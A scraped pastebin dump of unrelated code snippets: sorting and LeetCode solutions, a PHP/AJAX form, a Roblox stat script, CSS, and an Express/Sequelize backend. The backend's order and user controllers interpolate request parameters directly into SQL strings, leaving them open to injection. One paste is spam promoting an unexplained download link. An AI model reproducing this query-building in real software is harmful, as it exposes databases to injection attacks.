    public static void ioException(IOException e) {
        System.err.println(""IOException "".concat(e.getMessage()));
    }

    public static void noSuchAlgorithmException(NoSuchAlgorithmException e) {
        System.err.println(""NoSuchAlgorithmException"".concat(e.getMessage()));
    }

    public static void noSuchPaddingException(NoSuchPaddingException e) {
        System.err.println(""NoSuchPaddingException"".concat(e.getMessage()));
    }

    public static void illegalBlockSizeException(IllegalBlockSizeException e) {
        System.err.println(""IllegalBlockSizeException"".concat(e.getMessage()));
    }

    public static void invalidKeyException(InvalidKeyException e) {
        System.err.println(""InvalidKeyException"".concat(e.getMessage()));
    }

    public static void badPaddingException(BadPaddingException e) {
        System.err.println(""BadPaddingException"".concat(e.getMessage()));
    }
}"
RJbUk1xA,LSD_v1,Korotkodul,C++,Monday 2nd of October 2023 01:47:00 PM CDT,"#include <cmath>
#include <iostream>
#include <vector>

using std::cin;
using std::cout;
using std::max;
using std::min;
using std::string;
using std::vector;
using Ll = long long;

const int k20 = 20;
const int k10 = 10;
int len;
vector<Ll> ar;
vector<int> less_than;
vector<Ll> hlp;

int Digit(Ll num, int par) {
  Ll mod = pow(k10, par + 1);
  Ll div = pow(k10, par);
  return num % mod / div;
}

void LSD(int par) {
  less_than.assign(k10, 0);
  for (int id = 0; id < len; ++id) {
    int dig = Digit(ar[id], par);
    less_than[dig]++;
  }
  int cnt = 0;
  for (int id = 0; id < k10; ++id) {
    int point = less_than[id];
    less_than[id] = cnt;
    cnt += point;
  }
  for (int id = 0; id < len; ++id) {
    int dig = Digit(ar[id], par);
    hlp[less_than[dig]] = ar[id];
    less_than[dig]++;
  }
  ar = hlp;
}

int main() {
  /*std::ios::sync_with_stdio(false);
  std::cin.tie(0);
  std::cout.tie(0);*/
  cin >> len;
  ar.resize(len);
  hlp.resize(len);
  for (Ll& el : ar) {
    cin >> el;
  }
  for (int par = 0; par < k20; ++par) {
    LSD(par);
  }
  for (Ll el : ar) {
    cout << el << ""\n"";
  }
}
"
F7JPevZx,LeetCode 36 - Valid Sudoku - 2023.10.03 solution,nathanwailes,Python,Monday 2nd of October 2023 01:42:41 PM CDT,"class Solution:
    def isValidSudoku(self, board: List[List[str]]) -> bool:
        """""" Solution: Use three dicts-to-sets to track the three ways that repetition
        is not allowed.
        """"""
        rows_to_seen = dict()
        cols_to_seen = dict()
        squares_to_seen = dict()

        for c in range(9):
            if c not in cols_to_seen:
                cols_to_seen[c] = set()
            for r in range(9):
                if r not in rows_to_seen:
                    rows_to_seen[r] = set()
                if (c//3, r//3) not in squares_to_seen:
                    squares_to_seen[(c//3, r//3)] = set()
                current_value = board[c][r]
                if current_value == '.':
                    continue
                else:
                    current_value = int(current_value)
                if current_value == 5:
                    print(cols_to_seen[c])
                if current_value in cols_to_seen[c]:
                    return False
                if current_value in rows_to_seen[r]:
                    return False
                if current_value in squares_to_seen[(c//3, r//3)]:
                    return False
                cols_to_seen[c].add(current_value)
                rows_to_seen[r].add(current_value)
                squares_to_seen[(c//3, r//3)].add(current_value)
        return True


"
CWHrWdMk,Untitled,Skos_Martren,C++,Monday 2nd of October 2023 01:42:24 PM CDT,"constexpr int SIZE_ALPHABET = 26;

class Solution {

private:

    //constexpr int SIZE_ALPHABET = 26; // 'Solution::SIZE_ALPHABET' cannot be declared with 'constexpr' specifier // почему так?
    int LengthSubstr = 0;
public:

    int lengthOfLongestSubstringKDistinct(string& s, int k) { // ""0 <= k <= 50""

        if(k <= 0){ return LengthSubstr; }


        array<int, SIZE_ALPHABET> CharToCount; CharToCount.fill(0);        

        for (int RightBorderWindow = 0, LeftBorderWindow = 0; RightBorderWindow <= s.size() - 1; ++RightBorderWindow) { // move Right ptr

              while(RightBorderWindow < s.size() - 1 && k > 0){

                      if(++CharToCount[RightBorderWindow] == 1){ // новая буква (CharToCount[RightBorderWindow]) в sliding window
                          --k;
                      }
                      ++RightBorderWindow;

              } // RightBorderWindow указывет на последний символ sliding window
              

            while (LeftBorderWindow < RightBorderWindow && k < 0) { // move Left ptr

                if (--CharToCount[s[LeftBorderWindow] - 'a'] == 0) {
                    ++k;
                }
                ++LeftBorderWindow;
            } // LeftBorderWindow указывет на первый символ sliding window

            LengthSubstr = max(LengthSubstr, RightBorderWindow - LeftBorderWindow + 1);

        }

        return LengthSubstr;
    }

};
"
Jz2YSGdy,showName.php Code,CooLBuys1290,PHP,Monday 2nd of October 2023 01:40:56 PM CDT,"<?php
include 'database.php';
var_dump($_POST);
$idSelected = $_POST['identification'];
$query = $con->prepare(""SELECT name FROM crud WHERE id=?""); // prepate a query
$query->bind_param('i', $idSelected); // binding parameters via a safer way than via direct insertion into the query. 'i' tells mysql that it should expect an integer.
$query->execute(); // actually perform the query
$result = $query->get_result(); // retrieve the result so it can be used inside PHP
$r = $result->fetch_array(MYSQLI_ASSOC); // bind the data from the first result row to $r
echo $r['name']; // will return the price
?>"
5im5nZHp,Untitled,Skos_Martren,C++,Monday 2nd of October 2023 01:40:49 PM CDT,"constexpr int SIZE_ALPHABET = 26;

class Solution {

private:

    //constexpr int SIZE_ALPHABET = 26; // 'Solution::SIZE_ALPHABET' cannot be declared with 'constexpr' specifier // почему так?
    int LengthSubstr = 0;
public:

    int lengthOfLongestSubstringKDistinct(string& s, int k) { // ""0 <= k <= 50""

        if(k <= 0){ return LengthSubstr; }


        array<int, SIZE_ALPHABET> CharToCount; CharToCount.fill(0);        

        for (int RightBorderWindow = 0, LeftBorderWindow = 0; RightBorderWindow <= s.size() - 1; ++RightBorderWindow) { // move Right ptr

            if (++CharToCount[s[RightBorderWindow] - 'a'] == 1) { // новая буква (CharToCount[RightBorderWindow]) в sliding window
                --k;
            } // RightBorderWindow указывет на последний символ sliding window 


            while (LeftBorderWindow < RightBorderWindow && k < 0) { // move Left ptr

                if (--CharToCount[s[LeftBorderWindow] - 'a'] == 0) {
                    ++k;
                }
                ++LeftBorderWindow;
            } // LeftBorderWindow указывет на первый символ sliding window

            LengthSubstr = max(LengthSubstr, RightBorderWindow - LeftBorderWindow + 1);

        }

        return LengthSubstr;
    }

};"
2fcbBG5T,index.php AJAX Code,CooLBuys1290,JavaScript,Monday 2nd of October 2023 01:38:14 PM CDT,"<!DOCTYPE html>
<html>
<head>
	<title>Insert data in MySQL database using Ajax</title>
	<link rel=""stylesheet"" href=""https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css"">
	<link rel=""stylesheet"" type=""text/css"" href=""mystyle.css"">
	<script src=""https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js""></script>
	<meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
</head>
<body>
<div id=""targetLegit""> </div>
<div id=""targetLegit2""> </div>
<script>
$(document).ready(function() {

$('#butSave').on('click', function() {
let name = $('#name').val();
let email = $('#email').val();
let identification = $('#identification').val();

	$.ajax({
		url: ""save.php"",
		type: ""POST"",
		data: {
			name: name,
			email: email,
		},
		cache: false,
		success: function(dataResult){
			dataResult = JSON.parse(dataResult);
			if(dataResult.statusCode==200){
				$(""#butSave"").removeAttr(""disabled"");
				$('#fupForm').find('input:text').val('');
				$(""#success"").show();
				$('#success').html('Data added successfully !'); 	
				$('#targetLegit').load('show.php');
				$('#targetLegit2').load('showName.php', {identification: identification});
			}
			else if(dataResult.statusCode==201){
				alert(""Error occured !"");
			}
			
		
	}

	});
});

$('#butLoad').on('click', function() {
let identification = $('#identification').val();

	$.ajax({
		url:  ""showName.php"",
		type: ""POST"",
		data: {
			identification: identification
		},
		cache: false,
		success: function(dataResult){
			dataResult = JSON.parse(dataResult);
			if(dataResult.statusCode==200){
				$('#fupForm').find('input:text').val('');
				$(""#success"").show();
				$('#success').html('Data added successfully !'); 	
				$('#targetLegit3').load('showName.php', {identification: identification});
			}
			else if(dataResult.statusCode==201){
				alert(""Error occured !"");
			}
			
		
	}

	});
});

});
</script>
<?php
	error_reporting(E_ALL);
    ini_set('display_errors', 1);
    	        echo <<<EOT
        <p> FORUM CODE HERE </p>
<div style=""margin: auto;width: 60%;"">
	<div class=""alert alert-success alert-dismissible"" id=""success"" style=""display:none;"">
	  <a href=""#"" class=""close"" data-dismiss=""alert"" aria-label=""close"">×</a>
	</div>
	<form id=""fupForm"" name=""form1"" method=""post"">
		<div class=""form-group"">
			<label for=""name"">Name:</label>
			<input type=""text"" class=""form-control"" id=""name"" placeholder=""Name"" name=""name"">
		</div>
		<div class=""form-group"">
			<label for="""">Email:</label>
			<input type=""email"" class=""form-control"" id=""email"" placeholder=""Email"" name=""email"">
		</div>
		<div class=""form-group"">
			<label for=""id"">Identification #:</label>
			<input type=""number"" class=""form-control"" id=""identification"" placeholder=""id"" name=""identification"">
		</div>
		<input type=""button"" name=""save"" class=""btn btn-primary btn-lg"" value=""Save to Database"" id=""butSave"">
		<input type=""button"" name=""load"" class=""btn btn-primary btn-lg"" value=""Load From Database"" id=""butLoad"">
	</form>
</div>
</body>
EOT;
?>
</html>"
y4RJ5fn5,Baseplate Infinite Minutes Script!,AndreisScript,Lua,Monday 2nd of October 2023 01:37:52 PM CDT,"game.Players[""Your Username""].leaderstats[""Minutes""].Value = 10000
"
fu3qwvSs,Untitled,Skos_Martren,C++,Monday 2nd of October 2023 01:32:02 PM CDT,"//constexpr int SIZE_ALPHABET = 26;

class Solution {

private:

     constexpr int SIZE_ALPHABET = 26; // 'Solution::SIZE_ALPHABET' cannot be declared with 'constexpr' specifier // почему так?
    int LengthSubstr = 0;
public:

    int lengthOfLongestSubstringKDistinct(string_view s, int k) { // ""0 <= k <= 50""

        if(k <= 0){ return LengthSubstr; }


        array<int, SIZE_ALPHABET> CharToCount; CharToCount.fill(0);        

        for (int RightBorderWindow = 0, LeftBorderWindow = 0; RightBorderWindow <= s.size() - 1; ++RightBorderWindow) { // move Right ptr

            if (++CharToCount[s[RightBorderWindow] - 'a'] == 1) { // новая буква (CharToCount[RightBorderWindow]) в sliding window
                --k;
            } // RightBorderWindow указывет на последний символ sliding window 

            while (LeftBorderWindow < RightBorderWindow && k < 0) { // move Left ptr

                if (--CharToCount[s[LeftBorderWindow] - 'a'] == 0) {
                    ++k;
                }
                ++LeftBorderWindow;
            } // LeftBorderWindow указывет на первый символ sliding window

            LengthSubstr = max(LengthSubstr, RightBorderWindow - LeftBorderWindow + 1);

        }

        return LengthSubstr;
    }

};


"
EyBzGGC1,Backend Express,alvinfnaldi,JavaScript,Monday 2nd of October 2023 01:30:50 PM CDT,"// server.js
import ""dotenv/config"";
import express from ""express"";
import route from ""./routing/route.js"";

const app = express();
const port = process.env.PORT || 7200;

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.use(route);

app.listen(port, () => {
  console.log(`Server running on port ${port}`);
});

// package.json
{
  ""name"": ""latbackend"",
  ""version"": ""1.0.0"",
  ""description"": """",
  ""main"": ""index.js"",
  ""type"": ""module"",
  ""scripts"": {
    ""start"": ""nodemon server"",
    ""test"": ""echo \""Error: no test specified\"" && exit 1"",
    ""genModelDB"": ""sequelize-auto -o ./model2 -d Eproduct -h localhost -v true -l esm -u postgres -p 5432 -x alvin -e postgres""
  },
  ""keywords"": [],
  ""author"": """",
  ""license"": ""ISC"",
  ""dependencies"": {
    ""bcrypt"": ""^5.1.1"",
    ""dotenv"": ""^16.3.1"",
    ""express"": ""^4.18.2"",
    ""jsonwebtoken"": ""^9.0.2"",
    ""pg"": ""^8.11.3"",
    ""sequelize"": ""^6.33.0"",
    ""sequelize-auto"": ""^0.8.8""
  },
  ""devDependencies"": {
    ""nodemon"": ""^3.0.1""
  }
}

// errorhandling.js
const errorHandling = (data = """", code, message) => {
  return {
    data: data,
    code: code,
    message: message,
  };
};

export { errorHandling };

// init-models.js
import { Sequelize } from ""sequelize"";

const sequelize = new Sequelize(
  process.env.DB_NM,
  process.env.DB_USER,
  process.env.DB_PASSWORD,
  {
    dialect: ""postgres"",
    pool: {
      max: 5,
      min: 0,
      acquire: 30000,
      idle: 10000,
    },
  }
);

if (sequelize) {
  setTimeout(() => {
    console.log(""Database Connected!"");
  }, 1000);
}

const models = initModels(sequelize);
export default models;
export { sequelize };

// order.js
import { errorHandling } from ""../helper/errorhandling.js""
import { sequelize } from ""../model/init-models.js""

const insertorder = async (req, res) => {
    try {
        const {dt_order, dt_orderdetail} = req.body
        const query = `call insertorder('[${JSON.stringify(dt_order)}]', '${JSON.stringify(dt_orderdetail)}')`
        const result = await sequelize.query(query)
        res.send(errorHandling(result, 200, ""Sukses""))
    } catch (error) {
        res.send(errorHandling(400, error.message))
    }
}

const updateorder = async (req, res) => {
    try {
        const {dt_order, dt_orderdetail} = req.body
        console.log(dt_order)
        console.log(dt_orderdetail)
        const query = `call updateorder('[${JSON.stringify(dt_order)}]', '${JSON.stringify(dt_orderdetail)}')`
        const result = await sequelize.query(query)
        res.send(errorHandling(result, 200, ""Sukses Update""))
    } catch (error) {
        res.send(errorHandling(400, error.message))
    }
}

export { insertorder, updateorder }

// user.js
import bcrypt from ""bcrypt"";
import { errorHandling } from ""../helper/errorhandling.js"";
import models, { sequelize } from ""../model/init-models.js"";
import jwt from ""jsonwebtoken"";

const listuser = async (req, res) => {
  try {
    const result = await models.users.findAll(); // select * from users
    res.send(errorHandling(result, 200, ""Sukses""));
  } catch (error) {
    res.send(errorHandling(400, error.message));
  }
};

const createuser = async (req, res) => {
  try {
    const { usr, pswd } = req.body;
    const userExists = await models.users.findOne({ where: { username: usr } });
    if (userExists) {
      res.status(400);
      throw new Error(`Username ${usr} already exists`);
    }
    const salt = bcrypt.genSaltSync(10);
    const passhash = bcrypt.hashSync(pswd, salt);
    const result = await models.users.create(
      {
        username: usr,
        password: passhash,
      },
      { returning: true }
    );

    res.send(errorHandling(result, 200, ""Sukses Create""));
  } catch (error) {
    res.send(errorHandling(error.message));
  }
};

const updateuser = async (req, res) => {
  try {
    const salt = bcrypt.genSaltSync(10);
    const passhash = bcrypt.hashSync(req.body.pswd, salt);
    const result = await models.users.update(
      {
        username: req.body.usr,
        password: passhash,
      },
      {
        where: { id: req.params.id },
        returning: true,
      }
    );
    res.send(errorHandling(result, 200, ""Sukses Update""));
  } catch (error) {
    res.send(errorHandling(400, error.message));
  }
};

const deleteuser = (req, res) => {
  try {
    const result = models.users.destroy({
      where: { id: req.params.id },
      returning: true,
    });
    res.send(errorHandling(result, 200, ""Sukses Delete""));
  } catch (error) {
    res.send(errorHandling(400, error.message));
  }
};

const getusercustomer = async (req, res) => {
  try {
    // untuk menampilkan left join
    // const result = await models.users.findAndCountAll({
    //   include: 'customers'
    // })

    // untuk menampilkan inner join
    // const result = await models.users.findAndCountAll({
    //   include: { model: models.customer, as: ""customers"", required: true },
    // });

    // menampilkan atribut yg digunakan
    // const result = await models.users.findAndCountAll({
    //   include: [
    //     {
    //       model: models.customer,
    //       as: ""customers"",
    //       required: true,
    //       attributes: [""first_name"", ""last_name""],
    //     },
    //     {
    //       model: models.orders,
    //       as: ""orders"",
    //       include: { model: models.order_detail, as: ""order_details"" },
    //       atributes: [""username""],
    //     },
    //   ],
    // });

    //show all details
    const result = await models.users.findAll({
      include: { all: true, nested: true },
    });
    res.send(errorHandling(result, 200, ""Sukses""));
  } catch (error) {
    res.send(errorHandling(400, error.message));
  }
};

//syntax sql
const getview = async (req, res) => {
  try {
    const query = `select * from data_eproduct`;
    const result = await sequelize.query(query);
    res.send(errorHandling(result, 200, ""Sukses""));
  } catch (error) {
    res.send(errorHandling(400, error.message));
  }
};

//using view
const viewmodel = async (req, res) => {
  try {
    const result = await models.data_eproduct.findAll();
    res.send(errorHandling(result, 200, ""Sukses""));
  } catch (error) {
    res.send(errorHandling(400, error.message));
  }
};

//pagination
const datacur = async (req, res) => {
  try {
    const query = `select * from datacursor(${req.params.lim},${req.params.page})`;
    const result = await sequelize.query(query);
    res.send(errorHandling(result[0], 200, ""Sukses""));
  } catch (error) {
    res.send(errorHandling(400, error.message));
  }
};

//search
const searchuname = async (req, res) => {
  try {
    const query = `select * from searchuname('${req.params.usr}')`;
    const result = await sequelize.query(query);
    res.send(errorHandling(result[0], 200, ""Sukses""));
  } catch (error) {
    res.send(errorHandling(400, error.message));
  }
};

//method login
const login = async (req, res) => {
  try {
    const { usr, pswd } = req.body;

    const user = await models.users.findOne({ where: { username: usr } });
    if (!user) {
      res.send(errorHandling(""Username tidak ditemukan"", 400));
    } else {
      const matchPassword = bcrypt.compareSync(pswd, user.password);
      if (matchPassword) {
        const token = jwt.sign(
          { username: user.username, createdat: user.createdat },
          process.env.SECRET_KEY, { expiresIn: ""10s"" }
        );
        res.send(errorHandling(token, 200, ""Sukses""));
      } else {
        res.send(errorHandling(400, ""Password salah""));
      }
    }
  } catch (error) {
    res.send(errorHandling(400, error.message));
  }
};

//method cek authorize
const checkToken = async (req, res, next) => {
  try {
    const token = req.headers.authorization;
    if (!token) {
      res.send(errorHandling(200, ""Not authorized""));
    } else {
      const verify = jwt.verify(token, process.env.SECRET_KEY);
      if (verify) {
        next();
      }
    }
  } catch (error) {
    res.send(errorHandling(400, error.message));
  }
};

export { listuser, createuser, updateuser, deleteuser, getusercustomer, getview, viewmodel, datacur, searchuname, login, checkToken };

// route.js
import { Router } from ""express"";
import { home } from ""../controller/home.js"";
import { listuser, createuser, updateuser, deleteuser, getusercustomer, getview, viewmodel, datacur, searchuname, login, checkToken } from ""../controller/user.js"";
import { insertorder, updateorder } from ""../controller/order.js"";

const router = Router();

router.get(""/"", home);
router.get(""/user"", checkToken, listuser);

router.post(""/user"", createuser);

router.put(""/user/:id"", updateuser);
router.delete(""/user/:id"", deleteuser);

router.post(""/insertorder"", insertorder);
router.put(""/updateorder"", updateorder);

router.delete(""/insertorder/:id"");

router.get(""/getusercustomer"", getusercustomer);
router.get(""/getdataeproduct"", getview);
router.get(""/viewmodel"", viewmodel);
router.get(""/datacur/:lim/:page"", datacur);
router.get(""/searchuname/:usr"", searchuname);

router.post(""/login"", login);

export default router;"
CBdTy1xv,lesson_321_18,valenki13,C++,Monday 2nd of October 2023 01:28:51 PM CDT,"#include <iostream>

using namespace std;

void tast_battleship() {
	for (int k = 1; k <= 8; k++) {
		for (char ch = 'A'; ch <= 'H'; ch++) {
			cout << ch << k << "" "";
		}
		cout << endl;
	}
}

void task_color() {
	cout << ""\033[44;33mHello\033[0m"" << endl;

	for (int mode = 0; mode < 110; mode++) {
		cout << ""\033["" << mode << ""m ""
			<< mode << "" \033[0m"";
		if ((mode + 1) % 20 == 0) {
			cout << endl;
		}
	}
}

void vect_like_matr() {
	const int n1 = 7;
	const int n2 = 4;
	//int matr[n1][n2];
	int vect[n1 * n2];
	for (int k = 0; k < n1; k++) {
		for (int n = 0; n < n2; n++) {
			vect[k * n2 + n] = k * n2 + n;
			//matr[k][n] = k * n;
		}
	}

	for (int k = 0; k < n1; k++) {
		for (int n = 0; n < n2; n++) {
			cout.width(2);
			cout << vect[k * n2 + n] << "" "";
		}
		cout << endl;
	}


}

void test_memory() {
	int v[]{ 1,2,3,4,5,6,7,8,9 };
	int m[][3]{{1,2,3},{4,5,6},{7,8,9}};
	int k = 250;

	cout << &k << endl;

	cout << v[0] << "" "" 
		 << v << "" "" 
		 << &(v[0]) << endl;
	
	cout << m[0][0] << "" ""
		<< m[0] << "" ""
		<< m << "" ""
		<< &(m[0]) << "" ""
		<< &(m[0][0]) << endl;
}

int get_rand(int a, int b) {
	return rand() % (b - a + 1) + a;
}

const int width = 5;
const int heigh = 6;

void gen_arr2d(int size1, int size2, int arr[][width]) {
	for (int k = 0; k < size1; k++)
		for (int n = 0; n < size2; n++)
			arr[k][n] = get_rand(-10, 10);
}

void show_arr2d(int size1, int size2, int arr[][width]) {
	
	for (int k = 0; k < size1; k++) {		
		for (int n = 0; n < size2; n++) {
			cout.width(3);
			cout << arr[k][n] << "" "";
		}
		cout << endl;
	}
}

void calc_arr2(int size1, int size2, int arr[][width]) {
	for (int k = 0; k < size1; k++)
		arr[k][size2 - 1] = 0;

	for (int n = 0; n < size2 - 1; n++)
		arr[size1 - 1][n] = 0;

	for (int k = 0; k < size1 - 1; k++) {
		for (int n = 0; n < size2 - 1; n++) {
			arr[k][size2 - 1] += arr[k][n];
			arr[size1 - 1][n] += arr[k][n];
			arr[size1 - 1][size2 - 1] += arr[k][n];
		}
	}		
}


void rowcol_sum() {
	int matr[heigh][width];
	gen_arr2d(heigh-1, width-1, matr);	
	calc_arr2(heigh, width, matr);
	show_arr2d(heigh, width, matr);
}

int main() {
	srand(time(NULL));
	//tast_battleship();
	//task_color();
	//test_memory();
	//vect_like_matr();

	rowcol_sum();

	return 0;
}"
MbevRtT4,Untitled,tartley,Bash,Monday 2nd of October 2023 01:18:53 PM CDT,"#!/usr/bin/env bash

function usage {
    echo 'Usage: it [-k|-h] COMMAND'
    echo 'Run COMMAND in a new iTerm window, where OPTIONS may include:'
    echo '--help|-h : Show this help.'
    echo '--keep|-k : Keep the window after the command completes.'
}

keep=false

while [ $# -gt 0 ]; do
    echo ""arg $1""
    case ""$1"" in
        -h|--help) usage; exit;;
        -k|--keep) keep=true;;
        --) break;;
        -*|--*) echo ""Unrecognized arg $1"" >&2; exit 1;;
        *) break;;
    esac
    shift
done

if [ ""$keep"" = true ]; then
    command=""$@""
else
    command=""$@ ; exit""
fi

osascript - ""$command"" <<EOF
on run argv
tell application ""iTerm""
    activate
    set new_term to (create window with default profile)
    tell new_term
        tell the current session
            repeat with arg in argv
               write text arg
            end repeat
        end tell
    end tell
end tell
end run
EOF
"
SFG6w67v,Untitled,sissou123,C,Monday 2nd of October 2023 01:07:30 PM CDT,"LearnCProgramming
C is one of the most efficient programming languages that help you understand how the software and hardware interact with each other

for more:https://multipload.io/939D3"
89C9M68b,data-table.css,rivg26,CSS,Monday 2nd of October 2023 01:06:42 PM CDT,"@charset ""UTF-8"";

/* Datatables CSS */
.dt-center .pagination {
    justify-content: center !important;
}
table.dataTable, td{
    border: 1px solid #D3D3D3;
    border-collapse: collapse;
    
}
.pointer-active{
  pointer-events: auto !important;
  cursor: text;
}
#select_all_student{
  pointer-events: auto;
  cursor: pointer;
  /* table-layout: fixed;  */
  /* word-wrap:break-word; */
  /* transform: scale(1.2); */
}
table.dataTable, td:first-child{
  cursor: pointer;
  pointer-events: auto;
}
#student_table.dataTable, #student_table td:not(:first-child){
  pointer-events: none;
}
.ui-datepicker-trigger{
  cursor: pointer;
}
table.dataTable thead{
    background-color: #2B93B8;
    color: #F1FFF3;
}
.datapicker{
  cursor: pointer;
}
table.dataTable td.dt-control {
  text-align: center;
  /* cursor: pointer; */
}
table.dataTable td.dt-control:before {
  height: 1em;
  width: 1em;
  margin-top: -9px;
  display: inline-block;
  color: white;
  border: 0.15em solid white;
  border-radius: 1em;
  box-shadow: 0 0 0.2em #444;
  box-sizing: content-box;
  text-align: center;
  text-indent: 0 !important;
  font-family: ""Courier New"", Courier, monospace;
  line-height: 1em;
  content: ""+"";
  background-color: #31b131;
}
table.dataTable tr.dt-hasChild td.dt-control:before {
  content: ""-"";
  background-color: #d33333;
}
 
table.dataTable thead > tr > th.sorting, table.dataTable thead > tr > th.sorting_asc, table.dataTable thead > tr > th.sorting_desc, table.dataTable thead > tr > th.sorting_asc_disabled, table.dataTable thead > tr > th.sorting_desc_disabled,
table.dataTable thead > tr > td.sorting,
table.dataTable thead > tr > td.sorting_asc,
table.dataTable thead > tr > td.sorting_desc,
table.dataTable thead > tr > td.sorting_asc_disabled,
table.dataTable thead > tr > td.sorting_desc_disabled {
  cursor: pointer;
  position: relative;
  padding-right: 26px;
}
table.dataTable thead > tr > th.sorting:before, table.dataTable thead > tr > th.sorting:after, table.dataTable thead > tr > th.sorting_asc:before, table.dataTable thead > tr > th.sorting_asc:after, table.dataTable thead > tr > th.sorting_desc:before, table.dataTable thead > tr > th.sorting_desc:after, table.dataTable thead > tr > th.sorting_asc_disabled:before, table.dataTable thead > tr > th.sorting_asc_disabled:after, table.dataTable thead > tr > th.sorting_desc_disabled:before, table.dataTable thead > tr > th.sorting_desc_disabled:after,
table.dataTable thead > tr > td.sorting:before,
table.dataTable thead > tr > td.sorting:after,
table.dataTable thead > tr > td.sorting_asc:before,
table.dataTable thead > tr > td.sorting_asc:after,
table.dataTable thead > tr > td.sorting_desc:before,
table.dataTable thead > tr > td.sorting_desc:after,
table.dataTable thead > tr > td.sorting_asc_disabled:before,
table.dataTable thead > tr > td.sorting_asc_disabled:after,
table.dataTable thead > tr > td.sorting_desc_disabled:before,
table.dataTable thead > tr > td.sorting_desc_disabled:after {
  position: absolute;
  display: block;
  opacity: 0.125;
  right: 10px;
  line-height: 9px;
  font-size: 0.8em;
}
table.dataTable thead > tr > th.sorting:before, table.dataTable thead > tr > th.sorting_asc:before, table.dataTable thead > tr > th.sorting_desc:before, table.dataTable thead > tr > th.sorting_asc_disabled:before, table.dataTable thead > tr > th.sorting_desc_disabled:before,
table.dataTable thead > tr > td.sorting:before,
table.dataTable thead > tr > td.sorting_asc:before,
table.dataTable thead > tr > td.sorting_desc:before,
table.dataTable thead > tr > td.sorting_asc_disabled:before,
table.dataTable thead > tr > td.sorting_desc_disabled:before {
  bottom: 50%;
  content: ""▲"";
}
table.dataTable thead > tr > th.sorting:after, table.dataTable thead > tr > th.sorting_asc:after, table.dataTable thead > tr > th.sorting_desc:after, table.dataTable thead > tr > th.sorting_asc_disabled:after, table.dataTable thead > tr > th.sorting_desc_disabled:after,
table.dataTable thead > tr > td.sorting:after,
table.dataTable thead > tr > td.sorting_asc:after,
table.dataTable thead > tr > td.sorting_desc:after,
table.dataTable thead > tr > td.sorting_asc_disabled:after,
table.dataTable thead > tr > td.sorting_desc_disabled:after {
  top: 50%;
  content: ""▼"";
}
table.dataTable thead > tr > th.sorting_asc:before, table.dataTable thead > tr > th.sorting_desc:after,
table.dataTable thead > tr > td.sorting_asc:before,
table.dataTable thead > tr > td.sorting_desc:after {
  opacity: 0.6;
}
table.dataTable thead > tr > th.sorting_desc_disabled:after, table.dataTable thead > tr > th.sorting_asc_disabled:before,
table.dataTable thead > tr > td.sorting_desc_disabled:after,
table.dataTable thead > tr > td.sorting_asc_disabled:before {
  display: none;
}
table.dataTable thead > tr > th:active,
table.dataTable thead > tr > td:active {
  outline: none;
}
 
div.dataTables_scrollBody table.dataTable thead > tr > th:before, div.dataTables_scrollBody table.dataTable thead > tr > th:after,
div.dataTables_scrollBody table.dataTable thead > tr > td:before,
div.dataTables_scrollBody table.dataTable thead > tr > td:after {
  display: none;
}
 
div.dataTables_processing {
  position: absolute;
  top: 50%;
  left: 50%;
  width: 200px;
  margin-left: -100px;
  margin-top: -26px;
  text-align: center;
  padding: 2px;
}
div.dataTables_processing > div:last-child {
  position: relative;
  width: 80px;
  height: 15px;
  margin: 1em auto;
}
div.dataTables_processing > div:last-child > div {
  position: absolute;
  top: 0;
  width: 13px;
  height: 13px;
  border-radius: 50%;
  background: #2b93b8;
  animation-timing-function: cubic-bezier(0, 1, 1, 0);
}
div.dataTables_processing > div:last-child > div:nth-child(1) {
  left: 8px;
  animation: datatables-loader-1 0.6s infinite;
}
div.dataTables_processing > div:last-child > div:nth-child(2) {
  left: 8px;
  animation: datatables-loader-2 0.6s infinite;
}
div.dataTables_processing > div:last-child > div:nth-child(3) {
  left: 32px;
  animation: datatables-loader-2 0.6s infinite;
}
div.dataTables_processing > div:last-child > div:nth-child(4) {
  left: 56px;
  animation: datatables-loader-3 0.6s infinite;
}
 
@keyframes datatables-loader-1 {
  0% {
    transform: scale(0);
  }
  100% {
    transform: scale(1);
  }
}
@keyframes datatables-loader-3 {
  0% {
    transform: scale(1);
  }
  100% {
    transform: scale(0);
  }
}
@keyframes datatables-loader-2 {
  0% {
    transform: translate(0, 0);
  }
  100% {
    transform: translate(24px, 0);
  }
}
table.dataTable.nowrap th, table.dataTable.nowrap td {
  white-space: nowrap;
}
table.dataTable th.dt-left,
table.dataTable td.dt-left {
  text-align: left;
}
table.dataTable th.dt-center,
table.dataTable td.dt-center,
table.dataTable td.dataTables_empty {
  text-align: center;
}
table.dataTable th.dt-right,
table.dataTable td.dt-right {
  text-align: right;
}
table.dataTable th.dt-justify,
table.dataTable td.dt-justify {
  text-align: justify;
}
table.dataTable th.dt-nowrap,
table.dataTable td.dt-nowrap {
  white-space: nowrap;
}
table.dataTable thead th,
table.dataTable thead td,
table.dataTable tfoot th,
table.dataTable tfoot td {
  text-align: left;
}
table.dataTable thead th.dt-head-left,
table.dataTable thead td.dt-head-left,
table.dataTable tfoot th.dt-head-left,
table.dataTable tfoot td.dt-head-left {
  text-align: left;
}
table.dataTable thead th.dt-head-center,
table.dataTable thead td.dt-head-center,
table.dataTable tfoot th.dt-head-center,
table.dataTable tfoot td.dt-head-center {
  text-align: center;
}
table.dataTable thead th.dt-head-right,
table.dataTable thead td.dt-head-right,
table.dataTable tfoot th.dt-head-right,
table.dataTable tfoot td.dt-head-right {
  text-align: right;
}
table.dataTable thead th.dt-head-justify,
table.dataTable thead td.dt-head-justify,
table.dataTable tfoot th.dt-head-justify,
table.dataTable tfoot td.dt-head-justify {
  text-align: justify;
}
table.dataTable thead th.dt-head-nowrap,
table.dataTable thead td.dt-head-nowrap,
table.dataTable tfoot th.dt-head-nowrap,
table.dataTable tfoot td.dt-head-nowrap {
  white-space: nowrap;
}
table.dataTable tbody th.dt-body-left,
table.dataTable tbody td.dt-body-left {
  text-align: left;
}
table.dataTable tbody th.dt-body-center,
table.dataTable tbody td.dt-body-center {
  text-align: center;
}
table.dataTable tbody th.dt-body-right,
table.dataTable tbody td.dt-body-right {
  text-align: right;
}
table.dataTable tbody th.dt-body-justify,
table.dataTable tbody td.dt-body-justify {
  text-align: justify;
}
table.dataTable tbody th.dt-body-nowrap,
table.dataTable tbody td.dt-body-nowrap {
  white-space: nowrap;
}
 
/*
 * Table styles
 */
table.dataTable {
